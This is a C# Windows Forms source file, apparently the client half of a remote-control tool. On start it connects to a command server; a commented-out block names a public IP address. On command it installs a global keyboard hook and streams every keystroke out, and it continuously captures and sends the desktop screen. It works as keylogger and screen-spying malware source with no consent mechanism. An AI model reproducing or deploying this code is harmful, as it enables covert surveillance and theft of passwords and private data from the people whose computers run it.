using Keystroke.API;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using Screna;
using System.IO;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Diagnostics;



namespace Client
{
    public partial class Form1 : Form
    {

        private TcpClient client;
        private TcpClient keylogClient;
        private TcpClient shareClient;
        private NetworkStream mainstream;
        private NetworkStream keylogStream;
        private NetworkStream ScreenStream;
        
        private IPEndPoint IPServer;
        private IPEndPoint IPKeyServer;
        private IPEndPoint IPShare;

        private Thread BeginKeylg ;
        private Thread ClientConnect;
        private Thread ScreenThread;

        string password;

        bool isKeyThreadStart = false;
        bool isScreenThreadStart = false;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            ClientConnect = new Thread(Connect2Server);
            ClientConnect.Start();
            ClientConnect.IsBackground = true;
        }

        void Connect2Server()
        {
            try
            {
                client = new TcpClient();
                keylogClient = new TcpClient();
                shareClient = new TcpClient();

                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12000);
                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12001);
                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12002);

                /*IPServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 14232);
                IPKeyServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 15202);
                IPShare = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 12896);*/
                /*
                string servername = "";
                var address = Dns.GetHostAddresses(servername);
                Debug.Assert(address.Length != 0);
                var endPoint = new IPEndPoint(address[0], 8080);

                server = new TcpClient(endPoint);

                */



                client.Connect(IPServer);
                shareClient.Connect(IPShare);
                keylogClient.Connect(IPKeyServer);

                GetPassword();
                GetCommand();

            }
            catch (Exception ex)
            {
                MessageBox.Show("Some client dont connect");
                MessageBox.Show(ex.ToString());
            }
        }


        void GetPassword()
        {
            try
            {
                mainstream = client.GetStream();
                byte[] data = new byte[1024];
                int numBytesRead = mainstream.Read(data, 0, data.Length);
                string getstr = Encoding.ASCII.GetString(data, 0, numBytesRead);
                
                if(numBytesRead> 0)
                {
                    if(getstr.StartsWith("pass:"))
                    {
                        password = getstr.Substring(5);
                        //MessageBox.Show(password);
                    }
                    
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void GetCommand()
        {
            
            while (client.Connected)
            {
                try
                {
                    mainstream = client.GetStream();
                    byte[] data = new byte[1024];
                    int numBytesRead=mainstream.Read(data, 0, data.Length);

                    string command = Encoding.ASCII.GetString(data, 0, numBytesRead);

                    if (command == "Key-log")
                    {
                        if(!isKeyThreadStart)
                    {
                            isKeyThreadStart = true;
                            BeginThreadLog();
                        }
                    }

                    else
                    {
                        if (command =="Share-Screen")
                        {
                            if (!isScreenThreadStart)
                            {
                                    isScreenThreadStart = true;
                                    BeginThreadShareScreen();

                            }
                        }
                    }
                }

                catch (IOException ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            Application.Exit();
        }

        void BeginThreadLog()
        {
            try
            {
                

                BeginKeylg = new Thread(KeyLog);
                BeginKeylg.Start();
                BeginKeylg.IsBackground = true;
                
                keylogStream = keylogClient.GetStream();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Thread end.");
                MessageBox.Show(ex.ToString());
            }
        }

        void BeginThreadShareScreen()
        {
            try
            {
                isScreenThreadStart= true;

                ScreenThread = new Thread(SendImage);
                ScreenThread.Start();
                ScreenThread.IsBackground = true;

                ScreenStream = shareClient.GetStream();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Share Screen Thread end.");
                MessageBox.Show(ex.ToString());
            }
        }

/*        void KeyLogConnect()
        {
            try
            {
                keylogClient = new TcpClient();
                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8001);
                keylogClient.Connect(IPKeyServer);
                keylogStream = keylogClient.GetStream();
                KeyLog();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }*/

        void SendKeylloger(string s)
        {
            byte[] msg = UTF8Encoding.UTF8.GetBytes(s);
            keylogStream.Write(msg, 0, msg.Length);
        }

        void KeyLog()
        {
            try
            {
                
                while (keylogClient.Connected)
                {
                    using (var api = new KeystrokeAPI())
                    {
                        api.CreateKeyboardHook((character) => { SendKeylloger(character.ToString()); });
                        Application.Run();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Keylog func end.");
                MessageBox.Show(ex.ToString());
            }
        }

/*        void ScreenConnect()
        {
            try
            {
                shareClient = new TcpClient();
                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8002);
                shareClient.Connect(IPShare);
                ScreenStream = shareClient.GetStream();
                SendImage();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }*/

        void SendImage()
        {
            try
            {
                while (shareClient.Connected)
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    ScreenStream = shareClient.GetStream();
                    binaryFormatter.Serialize(ScreenStream, GrabDesktop());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Share end.");
                MessageBox.Show(ex.Message);
            }
        }


        [DllImport("gdi32.dll", CharSet = CharSet.Auto, SetLastError = true, ExactSpelling = true)]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);


        public static double GetWindowsScreenScalingFactor(bool percentage = true)
        {
            using (Graphics graphicsObject = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr deviceContextHandle = graphicsObject.GetHdc();
                int logicalScreenHeight = GetDeviceCaps(deviceContextHandle, 10);
                int physicalScreenHeight = GetDeviceCaps(deviceContextHandle, 117);

                double scalingFactor = Math.Round(physicalScreenHeight / (double)logicalScreenHeight, 2);

                if (percentage)
                {
                    scalingFactor *= 100.0;
                }

                return scalingFactor;
            }
        }

        public static Size GetDisplayResolution()
        {
            var sf = GetWindowsScreenScalingFactor(false);
            var screenWidth = Screen.PrimaryScreen.Bounds.Width * sf;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height * sf;
            return new Size((int)screenWidth, (int)screenHeight);
        }



        private Image GrabDesktop()
        {
            Rectangle rect = Screen.PrimaryScreen.Bounds;

            rect.Height = (int)(GetDisplayResolution().Height);
            rect.Width = (int)(GetDisplayResolution().Width);


            Bitmap screenBitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
            Graphics screenGraphics = Graphics.FromImage(screenBitmap);
            screenGraphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);
            return screenBitmap;
        }






    }
}